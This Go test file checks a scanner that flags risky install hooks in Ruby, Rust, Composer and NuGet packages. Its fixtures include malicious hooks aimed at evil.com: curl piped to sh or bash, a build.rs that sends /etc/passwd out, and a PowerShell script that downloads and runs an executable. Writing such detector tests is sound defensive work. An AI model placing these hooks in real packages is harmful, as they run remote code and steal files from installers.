package installsurface

import (
	"testing"
)

// ---- Ruby -------------------------------------------------------------------

func TestAnalyzeRubyMaliciousExtconf(t *testing.T) {
	extconf := `
require 'mkmf'
system("curl https://evil.com/payload | sh")
create_makefile('native_ext')
`
	s := AnalyzeRuby(extconf, "")
	if len(s.Hooks) == 0 {
		t.Fatal("expected hooks from malicious extconf.rb")
	}
	h := s.Hooks[0]
	if h.Name != "extconf.rb" {
		t.Errorf("hook name = %q, want extconf.rb", h.Name)
	}
	hasCap := func(c Capability) bool {
		for _, cap := range h.Caps {
			if cap == c {
				return true
			}
		}
		return false
	}
	if !hasCap(CapNetwork) {
		t.Error("missing network capability")
	}
	if !hasCap(CapExec) {
		t.Error("missing exec capability")
	}
}

func TestAnalyzeRubyCleanExtconf(t *testing.T) {
	extconf := `
require 'mkmf'
create_makefile('my_ext')
`
	s := AnalyzeRuby(extconf, "")
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 hook (extconf.rb always has exec), got %d", len(s.Hooks))
	}
}

func TestAnalyzeRubyEmpty(t *testing.T) {
	s := AnalyzeRuby("", "")
	if len(s.Hooks) != 0 {
		t.Errorf("empty input should produce no hooks, got %d", len(s.Hooks))
	}
}

// ---- Rust -------------------------------------------------------------------

func TestAnalyzeRustMaliciousBuildRs(t *testing.T) {
	buildRs := `
use std::process::Command;
fn main() {
    Command::new("curl")
        .arg("https://evil.com/exfil")
        .arg("-d")
        .arg("@/etc/passwd")
        .output()
        .expect("failed");
}
`
	s := AnalyzeRust(buildRs)
	if len(s.Hooks) == 0 {
		t.Fatal("expected hooks from malicious build.rs")
	}
	h := s.Hooks[0]
	if h.Name != "build.rs" {
		t.Errorf("hook name = %q, want build.rs", h.Name)
	}
	hasCap := func(c Capability) bool {
		for _, cap := range h.Caps {
			if cap == c {
				return true
			}
		}
		return false
	}
	if !hasCap(CapNetwork) {
		t.Error("missing network capability")
	}
	if !hasCap(CapExec) {
		t.Error("missing exec capability")
	}
}

func TestAnalyzeRustCleanBuildRs(t *testing.T) {
	buildRs := `
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
`
	s := AnalyzeRust(buildRs)
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 hook (build.rs always has exec), got %d", len(s.Hooks))
	}
}

func TestAnalyzeRustEmpty(t *testing.T) {
	s := AnalyzeRust("")
	if len(s.Hooks) != 0 {
		t.Errorf("empty input should produce no hooks, got %d", len(s.Hooks))
	}
}

// ---- PHP/Composer -----------------------------------------------------------

func TestAnalyzePHPMaliciousScripts(t *testing.T) {
	scripts := map[string]string{
		"post-install-cmd": "curl https://evil.com/payload.sh | bash",
	}
	s := AnalyzePHP(scripts, "library")
	if len(s.Hooks) == 0 {
		t.Fatal("expected hooks from malicious post-install-cmd")
	}
	h := s.Hooks[0]
	if h.Name != "post-install-cmd" {
		t.Errorf("hook name = %q, want post-install-cmd", h.Name)
	}
	hasCap := func(c Capability) bool {
		for _, cap := range h.Caps {
			if cap == c {
				return true
			}
		}
		return false
	}
	if !hasCap(CapNetwork) {
		t.Error("missing network capability")
	}
}

func TestAnalyzePHPPlugin(t *testing.T) {
	s := AnalyzePHP(nil, "composer-plugin")
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 hook for composer-plugin type, got %d", len(s.Hooks))
	}
	if s.Hooks[0].Name != "composer-plugin" {
		t.Errorf("hook name = %q, want composer-plugin", s.Hooks[0].Name)
	}
}

func TestAnalyzePHPClean(t *testing.T) {
	s := AnalyzePHP(nil, "library")
	if len(s.Hooks) != 0 {
		t.Errorf("clean library should produce no hooks, got %d", len(s.Hooks))
	}
}

func TestAnalyzePHPNonInstallScript(t *testing.T) {
	scripts := map[string]string{
		"test": "phpunit",
	}
	s := AnalyzePHP(scripts, "library")
	if len(s.Hooks) != 0 {
		t.Errorf("non-install scripts should produce no hooks, got %d", len(s.Hooks))
	}
}

// ---- NuGet/.NET -------------------------------------------------------------

func TestAnalyzeDotNetMaliciousInstallPs1(t *testing.T) {
	scripts := map[string]string{
		"install.ps1": `
Invoke-WebRequest -Uri "https://evil.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
Start-Process "$env:TEMP\payload.exe"
`,
	}
	s := AnalyzeDotNet(scripts)
	if len(s.Hooks) == 0 {
		t.Fatal("expected hooks from malicious install.ps1")
	}
	h := s.Hooks[0]
	if h.Name != "install.ps1" {
		t.Errorf("hook name = %q, want install.ps1", h.Name)
	}
	hasCap := func(c Capability) bool {
		for _, cap := range h.Caps {
			if cap == c {
				return true
			}
		}
		return false
	}
	if !hasCap(CapNetwork) {
		t.Error("missing network capability")
	}
	if !hasCap(CapExec) {
		t.Error("missing exec capability")
	}
}

func TestAnalyzeDotNetClean(t *testing.T) {
	s := AnalyzeDotNet(nil)
	if len(s.Hooks) != 0 {
		t.Errorf("nil scripts should produce no hooks, got %d", len(s.Hooks))
	}
}

func TestAnalyzeDotNetInitPs1(t *testing.T) {
	scripts := map[string]string{
		"init.ps1": `Write-Host "Initializing package"`,
	}
	s := AnalyzeDotNet(scripts)
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 hook for init.ps1, got %d", len(s.Hooks))
	}
	if s.Hooks[0].Name != "init.ps1" {
		t.Errorf("hook name = %q, want init.ps1", s.Hooks[0].Name)
	}
}
